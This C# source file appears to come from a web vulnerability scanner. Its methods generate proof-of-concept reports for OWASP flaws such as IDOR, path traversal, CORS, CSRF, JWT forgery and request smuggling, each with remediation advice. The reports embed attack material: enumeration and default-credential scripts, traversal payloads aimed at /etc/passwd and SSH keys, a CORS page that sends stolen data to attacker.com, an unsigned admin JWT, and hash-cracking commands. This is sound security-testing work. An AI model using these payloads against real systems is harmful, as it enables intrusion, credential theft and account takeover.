using System;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Enhanced PoC generators for all new vulnerability types
    /// </summary>
    public partial class OWASPT10_2025_ScannerService
    {
        #region Enhanced PoC Generators

        private string GenerateIDORPoCAdvanced(string url, string param, string originalValue, string testValue)
        {
            return $@"Insecure Direct Object Reference (IDOR) PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Original Value: {originalValue}
Exploited Value: {testValue}

Attack Steps:

1. Normal Request (User's Own Resource):
   {ReplaceParameter(url, param, originalValue)}

2. Malicious Request (Other User's Resource):
   {ReplaceParameter(url, param, testValue)}

3. Automated Enumeration Script (Python):
```python
import requests

base_url = ""{url.Split('?')[0]}""
for i in range(1, 1000):
    test_url = f""{{base_url}}?{param}={{i}}""
    response = requests.get(test_url)
    if response.status_code == 200:
        print(f""Accessible resource: {param}={{i}}"")
        # Extract and save sensitive data
```

4. Mass Data Extraction:
   - Enumerate all IDs: 1-9999
   - Extract user profiles, documents, orders, etc.
   - Build complete database dump

Impact:
   - Unauthorized access to other users' data
   - Privacy violation (GDPR/CCPA)
   - Data aggregation for identity theft
   - Competitive intelligence theft

Remediation:
   - Implement proper authorization checks
   - Use random, non-sequential identifiers (UUIDs)
   - Validate user ownership before serving resources
   - Log and monitor access patterns
   - Implement rate limiting";
        }

        private string GeneratePathTraversalPoC(string url, string param, string payload)
        {
            return $@"Path Traversal PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

Exploitation Steps:

1. Basic File Disclosure:
   {ReplaceParameter(url, param, "../../../../etc/passwd")}
   Windows: {ReplaceParameter(url, param, "..\\..\\..\\..\\windows\\win.ini")}

2. Application Configuration Files:
   {ReplaceParameter(url, param, "../../../../etc/nginx/nginx.conf")}
   {ReplaceParameter(url, param, "../../../../var/www/html/config.php")}
   {ReplaceParameter(url, param, "../../../../.env")}

3. Log Files:
   {ReplaceParameter(url, param, "../../../../var/log/apache2/access.log")}
   {ReplaceParameter(url, param, "../../../../var/log/nginx/error.log")}

4. Database Credentials:
   {ReplaceParameter(url, param, "../../../../etc/mysql/my.cnf")}
   {ReplaceParameter(url, param, "../../../../var/www/html/wp-config.php")}

5. SSH Keys:
   {ReplaceParameter(url, param, "../../../../root/.ssh/id_rsa")}
   {ReplaceParameter(url, param, "../../../../home/user/.ssh/authorized_keys")}

6. Advanced Bypass Techniques:
   - Null byte: {payload}%00.jpg
   - Double encoding: %252e%252e%252f
   - URL encoding: %2e%2e%2f
   - Unicode: ..%c0%af

Impact:
   - Source code disclosure
   - Credentials exposure
   - System takeover via SSH keys
   - Database compromise

Remediation:
   - Never use user input in file paths
   - Use whitelist of allowed files
   - Implement chroot jail
   - Validate and sanitize all path inputs
   - Use basename() to strip directory components";
        }

        private string GenerateOpenRedirectPoC(string url, string param, string payload)
        {
            return $@"Open Redirect PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Malicious Redirect: {payload}

Phishing Attack Scenario:

1. Attacker crafts link:
   {ReplaceParameter(url, param, "http://evil.com")}

2. Victim receives email:
   ""Dear user, verify your account: {ReplaceParameter(url, param, "http://evil-paypal.com/login")}""

3. Trust Exploitation:
   - Link shows legitimate domain
   - Redirects to phishing site
   - Victim enters credentials

Advanced Exploitation:

1. OAuth/OIDC Attacks:
   Manipulate redirect_uri to steal authorization codes

2. XSS via Open Redirect:
   {ReplaceParameter(url, param, "javascript:alert(document.cookie)")}

3. SSRF Chain:
   {ReplaceParameter(url, param, "http://169.254.169.254/latest/meta-data/")}

Impact:
   - Credential theft via phishing
   - OAuth token stealing
   - Session hijacking
   - Malware distribution

Remediation:
   - Whitelist allowed redirect destinations
   - Validate redirect URLs server-side
   - Use relative URLs only
   - Implement user confirmation for external redirects";
        }

        private string GenerateMissingFunctionLevelAccessControlPoC(string url, string adminPath)
        {
            return $@"Missing Function Level Access Control PoC:

Target URL: {url}
Accessible Path: {adminPath}

Unauthorized Access:

1. Direct Access (No Authentication):
   GET {url}
   Response: 200 OK (Should be 401/403)

2. Common Administrative Paths:
   /admin
   /administrator
   /manage
   /dashboard
   /api/admin
   /api/users
   /wp-admin

3. API Enumeration:
   /api/users - List all users
   /api/users/1 - Get user details
   /api/users/1/delete - Delete user
   /api/config - View configuration

4. Hidden Endpoints:
   /.git/config
   /.env
   /backup.sql
   /config.php

Impact:
   - Administrative access without authentication
   - User data exposure
   - Data modification/deletion
   - System configuration changes

Remediation:
   - Implement authentication on all admin endpoints
   - Use role-based access control (RBAC)
   - Default deny approach
   - Regular security audits
   - Remove unused endpoints";
        }

        private string GenerateMissingSecurityHeaderPoC(string url, string header, string description)
        {
            return $@"Missing Security Header PoC:

Target URL: {url}
Missing Header: {header}
Risk: {description}

Recommended Header Configuration:

Strict-Transport-Security:
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

X-Frame-Options:
   X-Frame-Options: DENY
   Or: X-Frame-Options: SAMEORIGIN

X-Content-Type-Options:
   X-Content-Type-Options: nosniff

Content-Security-Policy:
   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';

X-XSS-Protection:
   X-XSS-Protection: 1; mode=block

Referrer-Policy:
   Referrer-Policy: strict-origin-when-cross-origin

Permissions-Policy:
   Permissions-Policy: geolocation=(), microphone=(), camera=()

Implementation Examples:

Apache (.htaccess):
   Header always set {header} ""[value]""

Nginx:
   add_header {header} ""[value]"" always;

Node.js (Express):
   app.use((req, res, next) => {{
       res.setHeader('{header}', '[value]');
       next();
   }});

Impact:
   - Increased vulnerability to attacks
   - No defense-in-depth protection
   - Browser security features disabled

Remediation:
   - Implement all recommended security headers
   - Test with securityheaders.com
   - Use helmet.js for Node.js apps
   - Regular header audits";
        }

        private string GenerateInsecureHeaderPoC(string url, string header, string value)
        {
            return $@"Insecure Header Configuration PoC:

Target URL: {url}
Header: {header}
Current Value: {value}

Security Risk:
   The current header value weakens security protections

Recommended Fix:

{header}:
   Current (Insecure): {value}
   Recommended (Secure): [Secure configuration]

Impact and Remediation in previous PoC...";
        }

        private string GenerateServerDisclosurePoC(string url, string serverInfo)
        {
            return $@"Server Information Disclosure PoC:

Target URL: {url}
Disclosed Information: {serverInfo}

Attacker Intelligence Gathering:

1. Version-Specific Exploits:
   Server: {serverInfo}
   → Search exploit-db for: {serverInfo}

2. Technology Stack Fingerprinting:
   → Identify vulnerable components
   → Find known CVEs
   → Automate exploitation

Impact:
   - Targeted attacks based on version
   - Automated vulnerability scanning
   - Reduced attack complexity

Remediation:
   - Remove/obscure Server header
   - Use generic values
   - Keep software updated";
        }

        private string GenerateTechDisclosurePoC(string url, string technology)
        {
            return $@"Technology Stack Disclosure PoC:

Target URL: {url}
X-Powered-By: {technology}

Impact:
   Reveals backend technology, enabling targeted attacks

Remediation:
   - Remove X-Powered-By header
   - Obscure technology stack
   - Use security-focused configurations";
        }

        private string GenerateCORSMisconfigurationPoC(string url, string origin, string allowOrigin)
        {
            return $@"CORS Misconfiguration PoC:

Target URL: {url}
Tested Origin: {origin}
Allowed Origin: {allowOrigin}

Exploitation:

1. Malicious Website (http://evil.com/steal.html):
```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('{url}', {{
    method: 'GET',
    credentials: 'include'
}})
.then(response => response.json())
.then(data => {{
    // Send stolen data to attacker
    fetch('http://attacker.com/collect', {{
        method: 'POST',
        body: JSON.stringify(data)
    }});
}});
</script>
</body>
</html>
```

2. Attack Scenario:
   - Victim visits evil.com
   - JavaScript makes authenticated request to {url}
   - Response includes sensitive data
   - Data is exfiltrated to attacker

Impact:
   - Sensitive data theft
   - Session hijacking
   - Account takeover

Remediation:
   - Never use wildcard (*) with credentials
   - Whitelist specific origins
   - Validate Origin header
   - Don't reflect Origin header";
        }

        private string GenerateClickjackingPoC(string url)
        {
            return $@"Clickjacking Vulnerability PoC:

Target URL: {url}

Attack Page (clickjack.html):
```html
<!DOCTYPE html>
<html>
<head>
<style>
#target_website {{
    position: absolute;
    width: 100%;
    height: 100%;
    opacity: 0.00001;
    z-index: 2;
}}
#decoy_website {{
    position: absolute;
    width: 100%;
    height: 100%;
    z-index: 1;
}}
</style>
</head>
<body>
<div id=""decoy_website"">
    <h1>Click here to win $1000!</h1>
    <button style=""position: absolute; top: 300px; left: 200px; padding: 50px;"">
        CLICK ME!
    </button>
</div>
<iframe id=""target_website"" src=""{url}""></iframe>
</body>
</html>
```

Attack Scenarios:

1. Unauthorized Actions:
   - User thinks they're clicking ""Win $1000""
   - Actually clicking ""Delete Account"" on hidden iframe

2. Like-Jacking:
   - Trick users into liking malicious pages
   - Spread malware/spam

3. Drag & Drop Attacks:
   - Trick users into dragging sensitive data
   - Exfiltrate information

Impact:
   - Unauthorized state-changing actions
   - Data theft via drag-and-drop
   - Privacy violations

Remediation:
   - Set X-Frame-Options: DENY or SAMEORIGIN
   - Use CSP frame-ancestors directive
   - Implement frame-busting JavaScript (not reliable alone)";
        }

        private string GenerateHTTPSmugglingPoC(string url)
        {
            return $@"HTTP Request Smuggling PoC:

Target URL: {url}

CL.TE Smuggling Attack:
```
POST {url} HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

TE.CL Smuggling Attack:
```
POST {url} HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

Attack Scenarios:

1. Bypassing Security Controls:
   - Smuggle requests past WAF
   - Access admin endpoints

2. Cache Poisoning:
   - Inject malicious responses
   - Affect multiple users

3. Request Hijacking:
   - Steal other users' requests
   - Capture credentials

Impact:
   - Authentication bypass
   - Cache poisoning
   - Request hijacking
   - XSS and other injection attacks

Remediation:
   - Use HTTP/2 (if possible)
   - Normalize requests
   - Disable support for both CL and TE
   - Strict request parsing";
        }

        private string GenerateVerboseErrorPoC(string url, string errorType)
        {
            return $@"Verbose Error Messages PoC:

Target URL: {url}
Error Type: {errorType}

Information Disclosed:
   - Stack traces
   - File paths
   - Database schema
   - Framework versions
   - Internal IP addresses

Attack Intelligence:

1. Technology Stack:
   → Identify exact versions
   → Find CVEs

2. File Structure:
   → Map application architecture
   → Locate sensitive files

3. Database Schema:
   → Extract table/column names
   → Build SQL injection attacks

Impact:
   - Reduced attack complexity
   - Targeted exploitation
   - Faster reconnaissance

Remediation:
   - Use generic error pages
   - Log detailed errors server-side only
   - Disable debug mode in production
   - Custom error handlers";
        }

        private string GenerateJWTNoneAlgorithmPoC(string url)
        {
            return $@"JWT None Algorithm Attack PoC:

Target URL: {url}

Attack Steps:

1. Capture Valid JWT:
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

2. Decode JWT:
   Header: {""alg"":""HS256"",""typ"":""JWT""}
   Payload: {""sub"":""user"",""iat"":1516239022}

3. Modify to None Algorithm:
   Header: {""alg"":""none"",""typ"":""JWT""}
   Payload: {""sub"":""admin"",""iat"":1516239022}

4. Create Malicious JWT (without signature):
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

5. Send Request:
   GET {url}
   Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

Other JWT Attacks:

1. Algorithm Confusion (RS256 → HS256)
2. Weak Secret Bruteforce
3. KID Header Injection
4. JKU/X5U URL Injection

Impact:
   - Authentication bypass
   - Privilege escalation
   - Account takeover

Remediation:
   - Explicitly verify algorithm
   - Use strong secrets (256+ bits)
   - Validate all JWT claims
   - Implement proper key management";
        }

        private string GenerateJWTWeakSecretPoC(string url)
        {
            return $@"JWT Weak Secret PoC:

Target URL: {url}

Brute Force Attack:

1. Capture JWT:
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE

2. Use jwt_tool or hashcat:
```bash
# JWT Tool
jwt_tool JWT_HERE -C -d secrets.txt

# Hashcat
hashcat -m 16500 -a 0 jwt.txt wordlist.txt

# John the Ripper
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
```

3. Common Weak Secrets:
   - secret
   - password
   - 123456
   - qwerty
   - jwt_secret

4. Once cracked, forge admin JWT

Impact:
   - Complete authentication bypass
   - Account takeover
   - Privilege escalation

Remediation:
   - Use secrets ≥256 bits
   - Random generation
   - Regular rotation
   - Consider asymmetric algorithms (RS256)";
        }

        private string GenerateCSRFPoC(string url, string method)
        {
            return $@"Cross-Site Request Forgery (CSRF) PoC:

Target URL: {url}
Method: {method}

Attack Page (csrf.html):
```html
<!DOCTYPE html>
<html>
<body>
<h1>You Won! Claim Your Prize!</h1>
<form id=""csrf"" action=""{url}"" method=""{method}"">
    <input type=""hidden"" name=""action"" value=""delete_account"">
    <input type=""hidden"" name=""confirm"" value=""yes"">
</form>
<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

JavaScript CSRF:
```javascript
fetch('{url}', {{
    method: '{method}',
    credentials: 'include',
    body: 'action=delete_account'
}});
```

Attack Scenarios:

1. Account Takeover:
   - Change email
   - Change password
   - Add attacker as admin

2. Financial Fraud:
   - Transfer money
   - Purchase items
   - Change billing info

3. Data Manipulation:
   - Delete content
   - Modify settings
   - Create backdoors

Impact:
   - Unauthorized actions
   - Financial loss
   - Data compromise
   - Account takeover

Remediation:
   - Implement CSRF tokens
   - SameSite cookie attribute
   - Verify Origin/Referer headers
   - Double-submit cookies
   - Custom headers for AJAX";
        }

        private string GenerateWeakCredentialsPoC(string loginUrl, string username, string password)
        {
            return $@"Weak Default Credentials PoC:

Login URL: {loginUrl}
Username: {username}
Password: {password}

Automated Attack:
```python
import requests

url = ""{loginUrl}""
weak_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('administrator', 'administrator'),
    ('root', 'root'),
    ('user', 'user')
]

for user, pwd in weak_creds:
    data = {{'username': user, 'password': pwd}}
    response = requests.post(url, data=data)
    if 'login' not in response.text.lower():
        print(f""Success: {{user}}/{{pwd}}"")
```

Impact:
   - Instant administrative access
   - Complete system compromise
   - Data breach
   - Service disruption

Remediation:
   - Force password change on first login
   - Implement strong password policy
   - No default credentials
   - Account lockout after failed attempts
   - Multi-factor authentication";
        }

        private string GenerateSessionFixationPoC(string url)
        {
            return $@"Session Fixation PoC:

Target URL: {url}

Attack Steps:

1. Attacker Obtains Session ID:
   GET {url}
   → Set-Cookie: PHPSESSID=attacker_controlled_id

2. Attacker Sends Link to Victim:
   {url}?PHPSESSID=attacker_controlled_id
   Or: Set cookie via XSS

3. Victim Logs In:
   Session ID: attacker_controlled_id (unchanged)

4. Attacker Uses Same Session:
   Cookie: PHPSESSID=attacker_controlled_id
   → Authenticated as victim

Impact:
   - Account hijacking
   - Session takeover
   - Unauthorized access

Remediation:
   - Regenerate session ID after authentication
   - Validate session ownership
   - Use secure, httpOnly cookies
   - Implement session timeout";
        }

        #endregion
    }
}
